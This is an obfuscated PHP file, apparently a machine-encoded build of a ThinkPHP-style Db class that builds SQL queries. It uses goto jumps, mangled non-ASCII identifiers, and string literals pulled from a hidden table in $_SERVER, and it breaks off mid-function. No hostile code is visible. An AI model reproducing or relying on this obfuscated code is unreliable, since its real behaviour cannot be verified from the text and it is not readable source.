<?php
 goto dâ¢‡ÙÙ¬Ô; a‹æ¯‹Ê: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\161" => "\74\76", "\x67\164" => "\x3e", "\145\147\164" => "\x3e\x3d", "\154\164" => "\74", "\x65\x6c\x74" => "\x3c\x3d", "\x6e\x6f\x74\154\151\153\x65" => "\x4e\117\124\40\114\111\x4b\105", "\x6c\x69\x6b\145" => "\x4c\111\113\105", "\151\156" => "\111\116", "\x6e\157\164\151\x6e" => "\x4e\x4f\x54\x20\x49\116", "\x6e\x6f\x74\x20\x69\x6e" => "\x4e\x4f\x54\40\x49\116", "\x62\x65\x74\x77\x65\x65\156" => "\102\x45\124\x57\105\105\116", "\156\x6f\x74\142\x65\x74\x77\145\x65\156" => "\116\x4f\124\40\102\105\x54\127\x45\x45\116", "\156\157\164\40\x62\x65\164\x77\x65\145\x6e" => "\x4e\117\x54\40\x42\x45\124\127\x45\105\116"); protected $selectSql = "\x53\x45\114\x45\103\124\x25\104\111\x53\x54\x49\x4e\x43\124\45\x20\x25\x46\111\105\114\x44\x25\x20\106\x52\x4f\115\40\x25\124\x41\x42\x4c\105\x25\x25\112\117\111\116\45\45\127\110\x45\122\105\x25\45\107\x52\117\125\x50\45\45\110\101\126\x49\116\107\45\x25\x4f\x52\104\105\x52\45\45\114\111\x4d\111\124\x25\40\45\125\116\111\117\116\45\45\103\117\115\115\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $¨ˆœŞ÷¥ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Õò”†—·][1010], $¨ˆœŞ÷¥); } public function factory($õ½ÂêïÆ = '') { $Ì®Õ÷é  =& $_SERVER[Õò”†—·]; $õ½ÂêïÆ = $this->parseConfig($õ½ÂêïÆ); if (empty($õ½ÂêïÆ[$Ì®Õ÷é [1011]])) { think_exception(think_lang($Ì®Õ÷é [1012])); } $this->dbType = ucwords(strtolower($õ½ÂêïÆ[$Ì®Õ÷é [1011]])); $³àğº¦¨ = $Ì®Õ÷é [1013] . $this->dbType; if (class_exists($³àğº¦¨)) { $˜¥ôŠí¶ = new $³àğº¦¨($õ½ÂêïÆ); if ($Ì®Õ÷é [1014] != strtolower($õ½ÂêïÆ[$Ì®Õ÷é [1011]])) { $˜¥ôŠí¶->dbType = strtoupper($this->dbType); } else { $˜¥ôŠí¶->dbType = $this->_getDsnType($õ½ÂêïÆ[$Ì®Õ÷é [966]]); } } else { think_exception(think_lang($Ì®Õ÷é [1015]) . $Ì®Õ÷é [1016] . $³àğº¦¨); } return $˜¥ôŠí¶; } public function __call($¨ºâ–˜É, $ÔÅ÷Å™ş) { if (method_exists($this, $¨ºâ–˜É)) { return call_user_func_array(array($this, $¨ºâ–˜É), $ÔÅ÷Å™ş); } } protected function _getDsnType($ê‘ÏüØ) { $ÒÍƒøÕ§ = explode($_SERVER[Õò”†—·][4], $ê‘ÏüØ); $ò”–—ã = strtoupper(trim($ÒÍƒøÕ§[0])); return $ò”–—ã; } private function parseConfig($æÏ£™Ğ™ = '') { $°µ¼ß… =& $_SERVER[Õò”†—·]; if (!empty($æÏ£™Ğ™) && is_string($æÏ£™Ğ™)) { $æÏ£™Ğ™ = $this->parseDSN($æÏ£™Ğ™); } elseif (is_array($æÏ£™Ğ™)) { $æÏ£™Ğ™ = array_change_key_case($æÏ£™Ğ™); $æÏ£™Ğ™ = array($°µ¼ß…[1011] => $æÏ£™Ğ™[$°µ¼ß…[1017]], $°µ¼ß…[938] => $æÏ£™Ğ™[$°µ¼ß…[1018]], $°µ¼ß…[939] => $æÏ£™Ğ™[$°µ¼ß…[1019]], $°µ¼ß…[936] => $æÏ£™Ğ™[$°µ¼ß…[1020]], $°µ¼ß…[937] => $æÏ£™Ğ™[$°µ¼ß…[1021]], $°µ¼ß…[31] => $æÏ£™Ğ™[$°µ¼ß…[1022]], $°µ¼ß…[966] => $æÏ£™Ğ™[$°µ¼ß…[1023]], $°µ¼ß…[27] => isset($æÏ£™Ğ™[$°µ¼ß…[1024]]) ? $æÏ£™Ğ™[$°µ¼ß…[1024]] : array()); } elseif (empty($æÏ£™Ğ™)) { if (think_config($°µ¼ß…[1025]) && $°µ¼ß…[1014] != strtolower(think_config($°µ¼ß…[1026]))) { $æÏ£™Ğ™ = $this->parseDSN(think_config($°µ¼ß…[1025])); } else { $æÏ£™Ğ™ = array($°µ¼ß…[1011] => think_config($°µ¼ß…[1026]), $°µ¼ß…[938] => think_config($°µ¼ß…[1027]), $°µ¼ß…[939] => think_config($°µ¼ß…[1028]), $°µ¼ß…[936] => think_config($°µ¼ß…[1029]), $°µ¼ß…[937] => think_config($°µ¼ß…[1030]), $°µ¼ß…[31] => think_config($°µ¼ß…[307]), $°µ¼ß…[966] => think_config($°µ¼ß…[1025]), $°µ¼ß…[27] => think_config($°µ¼ß…[1031])); } } return $æÏ£™Ğ™; } protected function initConnect($»Àğùç„ = true) { if (1 == think_config($_SERVER[Õò”†—·][32])) { $this->_linkID = $this->multiConnect($»Àğùç„); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $½£Ü“ÊÁ => $ªµµ½Ó) { $this->_linkID = $ªµµ½Ó; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ş¶ÑÎ±› = false) { $àÎ‡»ã =& $_SERVER[Õò”†—·]; static $¶Ğ¬ÀÆŒ = array(); static $œãƒÚÄì = -1; if (empty($¶Ğ¬ÀÆŒ)) { foreach ($this->config as $»í–¸¬É => $ë‰·’ô¢) { $¶Ğ¬ÀÆŒ[$»í–¸¬É] = explode($àÎ‡»ã[60], $ë‰·’ô¢); } } if (think_config($àÎ‡»ã[1032])) { if ($ş¶ÑÎ±› || think_config($àÎ‡»ã[455]) === !0) { $¬ò·ìãÎ = floor(mt_rand(0, think_config($àÎ‡»ã[1033]) - 1)); $œãƒÚÄì = $¬ò·ìãÎ; } else { if (is_numeric(think_config($àÎ‡»ã[1034]))) { $¬ò·ìãÎ = think_config($àÎ‡»ã[1034]); } else { $¬ò·ìãÎ = floor(mt_rand(think_config($àÎ‡»ã[1033]), count($¶Ğ¬ÀÆŒ[$àÎ‡»ã[936]]) - 1)); } } } else { $¬ò·ìãÎ = floor(mt_rand(0, count($¶Ğ¬ÀÆŒ[$àÎ‡»ã[936]]) - 1)); $œãƒÚÄì = $¬ò·ìãÎ; } $¬ò·ìãÎ = $œãƒÚÄì !== -1 ? $œãƒÚÄì : $¬ò·ìãÎ; $”£ÀŠ¤ = array($àÎ‡»ã[938] => isset($¶Ğ¬ÀÆŒ[$àÎ‡»ã[938]][$¬ò·ìãÎ]) ? $¶Ğ¬ÀÆŒ[$àÎ‡»ã[938]][$¬ò·ìãÎ] : $¶Ğ¬ÀÆŒ[$àÎ‡»ã[938]][0], $àÎ‡»ã[939] => isset($¶Ğ¬ÀÆŒ[$àÎ‡»ã[939]][$¬ò·ìãÎ]) ? $¶Ğ¬ÀÆŒ[$àÎ‡»ã[939]][$¬ò·ìãÎ] : $¶Ğ¬ÀÆŒ[$àÎ‡»ã[939]][0], $àÎ‡»ã[936] => isset($¶Ğ¬ÀÆŒ[$àÎ‡»ã[936]][$¬ò·ìãÎ]) ? $¶Ğ¬ÀÆŒ[$àÎ‡»ã[936]][$¬ò·ìãÎ] : $¶Ğ¬ÀÆŒ[$àÎ‡»ã[936]][0], $àÎ‡»ã[937] => isset($¶Ğ¬ÀÆŒ[$àÎ‡»ã[937]][$¬ò·ìãÎ]) ? $¶Ğ¬ÀÆŒ[$àÎ‡»ã[937]][$¬ò·ìãÎ] : $¶Ğ¬ÀÆŒ[$àÎ‡»ã[937]][0], $àÎ‡»ã[31] => isset($¶Ğ¬ÀÆŒ[$àÎ‡»ã[31]][$¬ò·ìãÎ]) ? $¶Ğ¬ÀÆŒ[$àÎ‡»ã[31]][$¬ò·ìãÎ] : $¶Ğ¬ÀÆŒ[$àÎ‡»ã[31]][0], $àÎ‡»ã[966] => isset($¶Ğ¬ÀÆŒ[$àÎ‡»ã[966]][$¬ò·ìãÎ]) ? $¶Ğ¬ÀÆŒ[$àÎ‡»ã[966]][$¬ò·ìãÎ] : $¶Ğ¬ÀÆŒ[$àÎ‡»ã[966]][0], $àÎ‡»ã[27] => isset($¶Ğ¬ÀÆŒ[$àÎ‡»ã[27]][$¬ò·ìãÎ]) ? $¶Ğ¬ÀÆŒ[$àÎ‡»ã[27]][$¬ò·ìãÎ] : $¶Ğ¬ÀÆŒ[$àÎ‡»ã[27]][0]); return $this->connect($”£ÀŠ¤, $¬ò·ìãÎ); } public function parseDSN($´ïØ·±ó) { $Ñ§˜­º± =& $_SERVER[Õò”†—·]; if (empty($´ïØ·±ó)) { return !1; } $ä¢°³šÑ = parse_url($´ïØ·±ó); if ($ä¢°³šÑ[$Ñ§˜­º±[208]]) { $ãïş±ŸÈ = array($Ñ§˜­º±[1011] => $ä¢°³šÑ[$Ñ§˜­º±[208]], $Ñ§˜­º±[938] => isset($ä¢°³šÑ[$Ñ§˜­º±[646]]) ? $ä¢°³šÑ[$Ñ§˜­º±[646]] : $Ñ§˜­º±[22], $Ñ§˜­º±[939] => isset($ä¢°³šÑ[$Ñ§˜­º±[1035]]) ? $ä¢°³šÑ[$Ñ§˜­º±[1035]] : $Ñ§˜­º±[22], $Ñ§˜­º±[936] => isset($ä¢°³šÑ[$Ñ§˜­º±[209]]) ? $ä¢°³šÑ[$Ñ§˜­º±[209]] : $Ñ§˜­º±[22], $Ñ§˜­º±[937] => isset($ä¢°³šÑ[$Ñ§˜­º±[210]]) ? $ä¢°³šÑ[$Ñ§˜­º±[210]] : $Ñ§˜­º±[22], $Ñ§˜­º±[31] => isset($ä¢°³šÑ[$Ñ§˜­º±[97]]) ? substr($ä¢°³šÑ[$Ñ§˜­º±[97]], 1) : $Ñ§˜­º±[22]); } else { preg_match($Ñ§˜­º±[1036], trim($´ïØ·±ó), $…™ªÌâû); $ãïş±ŸÈ = array($Ñ§˜­º±[1011] => $…™ªÌâû[1], $Ñ§˜­º±[938] => $…™ªÌâû[2], $Ñ§˜­º±[939] => $…™ªÌâû[3], $Ñ§˜­º±[936] => $…™ªÌâû[4], $Ñ§˜­º±[937] => $…™ªÌâû[5], $Ñ§˜­º±[31] => $…™ªÌâû[6]); } $ãïş±ŸÈ[$Ñ§˜­º±[966]] = $Ñ§˜­º±[22]; return $ãïş±ŸÈ; } protected function debug() { $í¹Ò¹±’ =& $_SERVER[Õò”†—·]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $í¹Ò¹±’[1037]; if (think_config($í¹Ò¹±’[1038])) { think_status($í¹Ò¹±’[1039]); think_trace($this->queryStr . $í¹Ò¹±’[1040] . think_status($í¹Ò¹±’[34], $í¹Ò¹±’[1039], 6) . $í¹Ò¹±’[1041], $í¹Ò¹±’[22], $í¹Ò¹±’[1042]); } } protected function parseLock($ÃîºèÂ = false) { $áäÕâ±Š =& $_SERVER[Õò”†—·]; if (!$ÃîºèÂ) { return $áäÕâ±Š[22]; } if ($áäÕâ±Š[968] == $this->dbType) { return $áäÕâ±Š[1043]; } return $áäÕâ±Š[1044]; } protected function parseSet($‰µş³Ï½) { $¾‡½èî =& $_SERVER[Õò”†—·]; foreach ($‰µş³Ï½ as $¡şÎÎğó => $£ø¼¾ë”) { if (is_array($£ø¼¾ë”) && $¾‡½èî[357] == $£ø¼¾ë”[0]) { $¸æï„æ¥[] = $this->parseKey($¡şÎÎğó) . $¾‡½èî[934] . $£ø¼¾ë”[1]; } elseif (is_scalar($£ø¼¾ë”) || is_null($£ø¼¾ë”)) { $¸æï„æ¥[] = $this->parseKey($¡şÎÎğó) . $¾‡½èî[934] . $this->parseValue($£ø¼¾ë”); } } return $¾‡½èî[1045] . implode($¾‡½èî[60], $¸æï„æ¥); } protected function bindParam($­¦œ©ÀÈ, $‚î–Ğ°) { $this->bind[$_SERVER[Õò”†—·][4] . $­¦œ©ÀÈ] = $‚î–Ğ°; } protected function parseBind($ŞŸ–™Ïİ) { $ŞŸ–™Ïİ = array_merge($this->bind, $ŞŸ–™Ïİ); $this->bind = array(); return $ŞŸ–™Ïİ; } function parseKey(&$¢ÄÆ×ñó, $ö†˜öÍ‚ = true) { if ($ö†˜öÍ‚) { $¢ÄÆ×ñó = $this->parseKeyCheck($¢ÄÆ×ñó); } return $¢ÄÆ×ñó; } function parseKeyCheck($œ”éËİí) { $Â°´”ö =& $_SERVER[Õò”†—·]; $œ”éËİí = trim($œ”éËİí); if (!preg_match($Â°´”ö[1046], $œ”éËİí)) { think_exception($Â°´”ö[1047] . $œ”éËİí); } return $œ”éËİí; } protected function parseValue($ÓŠÓ•Æ) { $…‘ÒçË =& $_SERVER[Õò”†—·]; if (is_string($ÓŠÓ•Æ)) { $ÓŠÓ•Æ = $…‘ÒçË[1007] . $this->escapeString($ÓŠÓ•Æ) . $…‘ÒçË[1007]; } elseif (isset($ÓŠÓ•Æ[0]) && is_string($ÓŠÓ•Æ[0]) && strtolower($ÓŠÓ•Æ[0]) == $…‘ÒçË[357]) { $ÓŠÓ•Æ = $this->escapeString($ÓŠÓ•Æ[1]); } elseif (is_array($ÓŠÓ•Æ)) { $ÓŠÓ•Æ = array_map(array($this, $…‘ÒçË[1008]), $ÓŠÓ•Æ); } elseif (is_bool($ÓŠÓ•Æ)) { $ÓŠÓ•Æ = $ÓŠÓ•Æ ? $…‘ÒçË[101] : $…‘ÒçË[229]; } elseif (is_null($ÓŠÓ•Æ)) { $ÓŠÓ•Æ = $…‘ÒçË[116]; } return $ÓŠÓ•Æ; } protected function parseField($Ş¬ø¾›•) { $¤œå‚Çí =& $_SERVER[Õò”†—·]; if (is_string($Ş¬ø¾›•) && strpos($Ş¬ø¾›•, $¤œå‚Çí[60])) { $Ş¬ø¾›• = explode($¤œå‚Çí[60], $Ş¬ø¾›•); } if (is_array($Ş¬ø¾›•)) { $ØÈÌ«Ó = array(); foreach ($Ş¬ø¾›• as $ˆƒ±©®… => $ÜÛ†Ğõè) { if (!is_numeric($ˆƒ±©®…)) { $ØÈÌ«Ó[] = $this->parseKey($ˆƒ±©®…, !1) . $¤œå‚Çí[1048] . $this->parseKey($ÜÛ†Ğõè); } else { $ØÈÌ«Ó[] = $this->parseKey($ÜÛ†Ğõè); } } $‡Ë•¡ = implode($¤œå‚Çí[60], $ØÈÌ«Ó); } elseif (is_string($Ş¬ø¾›•) && !empty($Ş¬ø¾›•)) { $‡Ë•¡ = $Ş¬ø¾›•; } else { $‡Ë•¡ = $¤œå‚Çí[221]; } return $‡Ë•¡; } protected function parseTable($Ğ‡Ì™·) { $Ú¹³¿½Ë =& $_SERVER[Õò”†—·]; if (is_array($Ğ‡Ì™·)) { $Ş¨²¯Öş = array(); foreach ($Ğ‡Ì™· as $Õà…Éşƒ => $¼´öå»†) { if (!is_numeric($Õà…Éşƒ)) { $Ş¨²¯Öş[] = $this->parseKey($Õà…Éşƒ) . $Ú¹³¿½Ë[63] . $this->parseKey($¼´öå»†); } else { $Ş¨²¯Öş[] = $this->parseKey($Õà…Éşƒ); } } $Ğ‡Ì™· = $Ş¨²¯Öş; } elseif (is_string($Ğ‡Ì™·)) { if (strstr($Ğ‡Ì™·, $Ú¹³¿½Ë[63])) { return $Ğ‡Ì™·; } $Ğ‡Ì™· = explode($Ú¹³¿½Ë[60], $Ğ‡Ì™·); array_walk($Ğ‡Ì™·, array($this, $Ú¹³¿½Ë[956])); } return $Ú¹³¿½Ë[950] . trim(implode($Ú¹³¿½Ë[1049], $Ğ‡Ì™·), $Ú¹³¿½Ë[445]) . $Ú¹³¿½Ë[950]; } protected function parseWhere($œÆ¹–ÆÏ) { $»Æ©õÖä =& $_SERVER[Õò”†—·]; $ÇÁ‚ò€ = $»Æ©õÖä[22]; if (is_string($œÆ¹–ÆÏ)) { $ÇÁ‚ò€ = $œÆ¹–ÆÏ; } else { $ØŸ¦å¾ = isset($œÆ¹–ÆÏ[$»Æ©õÖä[1050]]) ? strtoupper($œÆ¹–ÆÏ[$»Æ©õÖä[1050]]) : $»Æ©õÖä[22]; if (in_array($ØŸ¦å¾, array($»Æ©õÖä[1051], $»Æ©õÖä[1052], $»Æ©õÖä[1053]))) { $ØŸ¦å¾ = $»Æ©õÖä[63] . $ØŸ¦å¾ . $»Æ©õÖä[63]; unset($œÆ¹–ÆÏ[$»Æ©õÖä[1050]]); } else { $ØŸ¦å¾ = $»Æ©õÖä[1054]; } foreach ($œÆ¹–ÆÏ as $Ü§ˆşíƒ => $ˆú¶µæµ) { $ÇÁ‚ò€ .= $»Æ©õÖä[338]; if (is_numeric($Ü§ˆşíƒ)) { $Ü§ˆşíƒ = $»Æ©õÖä[1055]; } if (0 === strpos($Ü§ˆşíƒ, $»Æ©õÖä[21])) { $ÇÁ‚ò€ .= $this->parseThinkWhere($Ü§ˆşíƒ, $ˆú¶µæµ); } else { if (!preg_match($»Æ©õÖä[1056], trim($Ü§ˆşíƒ))) { think_exception(think_lang($»Æ©õÖä[1057]) . $»Æ©õÖä[4] . $Ü§ˆşíƒ); } $§Ú´—ş¤ = is_array($ˆú¶µæµ) && isset($ˆú¶µæµ[$»Æ©õÖä[1058]]); $Ü§ˆşíƒ = trim($Ü§ˆşíƒ); if (strpos($Ü§ˆşíƒ, $»Æ©õÖä[215])) { $øğÎçø÷ = explode($»Æ©õÖä[215], $Ü§ˆşíƒ); $æ•Ÿ™ì± = array(); foreach ($øğÎçø÷ as $ö¹­ÁäË => $÷î¤•€¼) { $‰İ€¡şğ = $§Ú´—ş¤ ? $ˆú¶µæµ[$ö¹­ÁäË] : $ˆú¶µæµ; $æ•Ÿ™ì±[] = $»Æ©õÖä[321] . $this->parseWhereItem($this->parseKey($÷î¤•€¼), $‰İ€¡şğ) . $»Æ©õÖä[955]; } $ÇÁ‚ò€ .= implode($»Æ©õÖä[1059], $æ•Ÿ™ì±); } elseif (strpos($Ü§ˆşíƒ, $»Æ©õÖä[344])) { $øğÎçø÷ = explode($»Æ©õÖä[344], $Ü§ˆşíƒ); $æ•Ÿ™ì± = array(); foreach ($øğÎçø÷ as $ö¹­ÁäË => $÷î¤•€¼) { $‰İ€¡şğ = $§Ú´—ş¤ ? $ˆú¶µæµ[$ö¹­ÁäË] : $ˆú¶µæµ; $æ•Ÿ™ì±[] = $»Æ©õÖä[321] . $this->parseWhereItem($this->parseKey($÷î¤•€¼), $‰İ€¡şğ) . $»Æ©õÖä[955]; } $ÇÁ‚ò€ .= implode($»Æ©õÖä[1054], $æ•Ÿ™ì±); } else { $ÇÁ‚ò€ .= $this->parseWhereItem($this->parseKey($Ü§ˆşíƒ), $ˆú¶µæµ); } } $ÇÁ‚ò€ .= $»Æ©õÖä[339] . $ØŸ¦å¾; } $ÇÁ‚ò€ = substr($ÇÁ‚ò€, 0, -strlen($ØŸ¦å¾)); } return empty($ÇÁ‚ò€) ? $»Æ©õÖä[22] : $»Æ©õÖä[1060] . $ÇÁ‚ò€; } protected function parseWhereItem($ÒîÆ­¼×, $ÖÎô‰åŞ) { $¥ßÆ›ª± =& $_SERVER[Õò”†—·]; $Ì‡ Âú = $¥ßÆ›ª±[22]; if (is_array($ÖÎô‰åŞ)) { if (is_string($ÖÎô‰åŞ[0])) { $è•î¾“ = strtolower($ÖÎô‰åŞ[0]); if (in_array($ÖÎô‰åŞ[0], array($¥ßÆ›ª±[934], $¥ßÆ›ª±[1061], $¥ßÆ›ª±[1062], $¥ßÆ›ª±[1063], $¥ßÆ›ª±[1064], $¥ßÆ›ª±[1065]))) { $Ì‡ Âú .= $ÒîÆ­¼× . $¥ßÆ›ª±[63] . $ÖÎô‰åŞ[0] . $¥ßÆ›ª±[63] . $this->parseValue($ÖÎô‰åŞ[1]); } elseif (preg_match($¥ßÆ›ª±[1066], $ÖÎô‰åŞ[0])) { $Ì‡ Âú .= $ÒîÆ­¼× . $¥ßÆ›ª±[63] . $this->exp[$è•î¾“] . $¥ßÆ›ª±[63] . $this->parseValue($ÖÎô‰åŞ[1]); } elseif (preg_match($¥ßÆ›ª±[1067], $ÖÎô‰åŞ[0])) { if (is_array($ÖÎô‰åŞ[1])) { $¦ÑŞèĞ = isset($ÖÎô‰åŞ[2]) ? strtoupper($ÖÎô‰åŞ[2]) : $¥ßÆ›ª±[1052]; if (in_array($¦ÑŞèĞ, array($¥ßÆ›ª±[1051], $¥ßÆ›ª±[1052], $¥ßÆ›ª±[1053]))) { $õõó×Şä = array(); foreach ($ÖÎô‰åŞ[1] as $§„‹ÚÂ‹) { $õõó×Şä[] = $ÒîÆ­¼× . $¥ßÆ›ª±[63] . $this->exp[$è•î¾“] . $¥ßÆ›ª±[63] . $this->parseValue($§„‹ÚÂ‹); } $Ì‡ Âú .= $¥ßÆ›ª±[321] . implode($¥ßÆ›ª±[63] . $¦ÑŞèĞ . $¥ßÆ›ª±[63], $õõó×Şä) . $¥ßÆ›ª±[955]; } } else { $Ì‡ Âú .= $ÒîÆ­¼× . $¥ßÆ›ª±[63] . $this->exp[$è•î¾“] . $¥ßÆ›ª±[63] . $this->parseValue($ÖÎô‰åŞ[1]); } } elseif ($¥ßÆ›ª±[357] == $è•î¾“) { $Ì‡ Âú .= $¥ßÆ›ª±[953] . $ÒîÆ­¼× . $¥ßÆ›ª±[63] . $ÖÎô‰åŞ[1] . $¥ßÆ›ª±[1068]; } elseif (preg_match($¥ßÆ›ª±[1069], $ÖÎô‰åŞ[0])) { $Ì‡ Âú .= $ÖÎô‰åŞ[0]; } elseif (preg_match($¥ßÆ›ª±[1070], $ÖÎô‰åŞ[0])) { if (isset($ÖÎô‰åŞ[2]) && $¥ßÆ›ª±[357] == $ÖÎô‰åŞ[2]) { $Ì‡ Âú .= $ÒîÆ­¼× . $¥ßÆ›ª±[63] . $this->exp[$è•î¾“] . $¥ßÆ›ª±[63] . $ÖÎô‰åŞ[1]; } else { if (is_string($ÖÎô‰åŞ[1])) { $ÖÎô‰åŞ[1] = explode($¥ßÆ›ª±[60], $ÖÎô‰åŞ[1]); } $åó³«è¤ = implode($¥ßÆ›ª±[60], $this->parseValue($ÖÎô‰åŞ[1])); $Ì‡ Âú .= $ÒîÆ­¼× . $¥ßÆ›ª±[63] . $this->exp[$è•î¾“] . $¥ßÆ›ª±[953] . $åó³«è¤ . $¥ßÆ›ª±[955]; } } elseif (preg_match($¥ßÆ›ª±[1071], $ÖÎô‰åŞ[0])) { $¡À©ª±Ğ = is_string($ÖÎô‰åŞ[1]) ? explode($¥ßÆ›ª±[60], $ÖÎô‰åŞ[1]) : $ÖÎô‰åŞ[1]; $Ì‡ Âú .= $¥ßÆ›ª±[953] . $ÒîÆ­¼× . $¥ßÆ›ª±[63] . $this->exp[$è•î¾“] . $¥ßÆ›ª±[63] . $this->parseValue($¡À©ª±Ğ[0]) . $¥ßÆ›ª±[1054] . $this->parseValue($¡À©ª±Ğ[1]) . $¥ßÆ›ª±[339]; } else { think_exception(think_lang($¥ßÆ›ª±[1057]) . $¥ßÆ›ª±[4] . $ÖÎô‰åŞ[0]); } } else { $¨£›Á²¤ = count($ÖÎô‰åŞ); $ëÍÛºı = $¥ßÆ›ª±[22]; if (is_string($ÖÎô‰åŞ[$¨£›Á²¤ - 1])) { $ëÍÛºı = isset($ÖÎô‰åŞ[$¨£›Á²¤ - 1]) ? strtoupper($ÖÎô‰åŞ[$¨£›Á²¤ - 1]) : $¥ßÆ›ª±[22]; if (in_array($ëÍÛºı, array($¥ßÆ›ª±[1051], $¥ßÆ›ª±[1052], $¥ßÆ›ª±[1053]))) { $¨£›Á²¤ = $¨£›Á²¤ - 1; } } else { $ëÍÛºı = $¥ßÆ›ª±[1051]; } for ($¦ëÊ´È = 0; $¦ëÊ´È < $¨£›Á²¤; $¦ëÊ´È++) { $¡À©ª±Ğ = is_array($ÖÎô‰åŞ[$¦ëÊ´È]) ? $ÖÎô‰åŞ[$¦ëÊ´È][1] : $ÖÎô‰åŞ[$¦ëÊ´È]; if ($¥ßÆ›ª±[357] == strtolower($ÖÎô‰åŞ[$¦ëÊ´È][0])) { $Ì‡ Âú .= $¥ßÆ›ª±[321] . $ÒîÆ­¼× . $¥ßÆ›ª±[63] . $¡À©ª±Ğ . $¥ßÆ›ª±[1068] . $ëÍÛºı . $¥ßÆ›ª±[63]; } else { $×†ÀÇÙ— = is_array($ÖÎô‰åŞ[$¦ëÊ´È]) ? $this->exp[strtolower($ÖÎô‰åŞ[$¦ëÊ´È][0])] : $¥ßÆ›ª±[934]; if (!$×†ÀÇÙ— && is_array($ÖÎô‰åŞ[$¦ëÊ´È]) && in_array($ÖÎô‰åŞ[$¦ëÊ´È][0], array($¥ßÆ›ª±[934], $¥ßÆ›ª±[1061], $¥ßÆ›ª±[1062], $¥ßÆ›ª±[1063], $¥ßÆ›ª±[1064], $¥ßÆ›ª±[1065]))) { $×†ÀÇÙ— = $ÖÎô‰åŞ[$¦ëÊ´È][0]; } $Ì‡ Âú .= $¥ßÆ›ª±[321] . $ÒîÆ­¼× . $¥ßÆ›ª±[63] . $×†ÀÇÙ— . $¥ßÆ›ª±[63] . $this->parseValue($¡À©ª±Ğ) . $¥ßÆ›ª±[1068] . $ëÍÛºı . $¥ßÆ›ª±[63]; } } $Ì‡ Âú = substr($Ì‡ Âú, 0, -4); } } else { $Ì‡ Âú .= $ÒîÆ­¼× . $¥ßÆ›ª±[1072] . $this->parseValue($ÖÎô‰åŞ); } return $Ì‡ Âú; } protected function parseThinkWhere($ßØöÍ®í, $“º×°ÛÄ) { $’Ìù¨€´ =& $_SERVER[Õò”†—·]; $ÓáŸ—à¡ = $’Ìù¨€´[22]; switch ($ßØöÍ®í) { case $’Ìù¨€´[412]: $ÓáŸ—à¡ = $“º×°ÛÄ; break; case $’Ìù¨€´[1055]: $ÓáŸ—à¡ = is_string($“º×°ÛÄ) ? $“º×°ÛÄ : substr($this->parseWhere($“º×°ÛÄ), 6); break; case $’Ìù¨€´[1073]: parse_str($“º×°ÛÄ, $À¹Ş§Ô—); if (isset($À¹Ş§Ô—[$’Ìù¨€´[1050]])) { $£ˆşÚÅˆ = $’Ìù¨€´[63] . strtoupper($À¹Ş§Ô—[$’Ìù¨€´[1050]]) . $’Ìù¨€´[63]; unset($À¹Ş§Ô—[$’Ìù¨€´[1050]]); } else { $£ˆşÚÅˆ = $’Ìù¨€´[1054]; } $şÊ×°éü = array(); foreach ($À¹Ş§Ô— as $ÛÄ–ã†Â => $ùÕØ†È) { $şÊ×°éü[] = $this->parseKey($ÛÄ–ã†Â) . $’Ìù¨€´[1072] . $this->parseValue($ùÕØ†È); } $ÓáŸ—à¡ = implode($£ˆşÚÅˆ, $şÊ×°éü); break; } return $ÓáŸ—à¡; } protected function parseLimit($öÇşº´Å) { $Íë§êª” =& $_SERVER[Õò”†—·]; return !empty($öÇşº´Å) ? $Íë§êª”[61] . $öÇşº´Å . $Íë§êª”[63] : $Íë§êª”[22]; } protected function parseJoin($ëäæ•ºÌ) { $¼â¹‹İÃ =& $_SERVER[Õò”†—·]; $¼Ñ¸Òç = $¼â¹‹İÃ[22]; if (!empty($ëäæ•ºÌ)) { if (is_array($ëäæ•ºÌ)) { foreach ($ëäæ•ºÌ as $Ä³›úúø => $ø÷øÈ‹Ş) { if (!1 !== stripos($ø÷øÈ‹Ş, $¼â¹‹İÃ[1074])) { $¼Ñ¸Òç .= $¼â¹‹İÃ[63] . $ø÷øÈ‹Ş; } else { $¼Ñ¸Òç .= $¼â¹‹İÃ[1075] . $ø÷øÈ‹Ş; } } } else { $¼Ñ¸Òç .= $¼â¹‹İÃ[1075] . $ëäæ•ºÌ; } } $¼Ñ¸Òç = preg_replace($¼â¹‹İÃ[1076], think_config($¼â¹‹İÃ[980]) . $¼â¹‹İÃ[1077], $¼Ñ¸Òç); return $¼Ñ¸Òç; } protected function parseOrder($ï‘ØèË) { $Ò¢–çô© =& $_SERVER[Õò”†—·]; if (is_array($ï‘ØèË)) { $³’…êóÊ = array(); foreach ($ï‘ØèË as $Ïõ´¦Ì => $½”Œ®Ã—) { if (is_numeric($Ïõ´¦Ì)) { $³’…êóÊ[] = $this->parseKey($½”Œ®Ã—); } else { $½”Œ®Ã— = in_array(strtoupper(trim($½”Œ®Ã—)), array($Ò¢–çô©[1078], $Ò¢–çô©[1079])) ? $Ò¢–çô©[63] . $½”Œ®Ã— : $Ò¢–çô©[22]; if (preg_match($Ò¢–çô©[1080], $Ïõ´¦Ì)) { $³’…êóÊ[] = $this->parseKey($Ïõ´¦Ì) . $½”Œ®Ã—; } else { think_exception($Ò¢–çô©[1081] . $Ïõ´¦Ì); } } } $ï‘ØèË = implode($Ò¢–çô©[60], $³’…êóÊ); } return !empty($ï‘ØèË) ? $Ò¢–çô©[1082] . $ï‘ØèË : $Ò¢–çô©[22]; } protected function parseGroup($ßíë…‹£) { $¨ºš´œö =& $_SERVER[Õò”†—·]; return !empty($ßíë…‹£) ? $¨ºš´œö[1083] . $ßíë…‹£ : $¨ºš´œö[22]; } protected function parseHaving($‰©Ô³ôŞ) { $ò€¶½úÏ =& $_SERVER[Õò”†—·]; return !empty($‰©Ô³ôŞ) ? $ò€¶½úÏ[1084] . $‰©Ô³ôŞ : 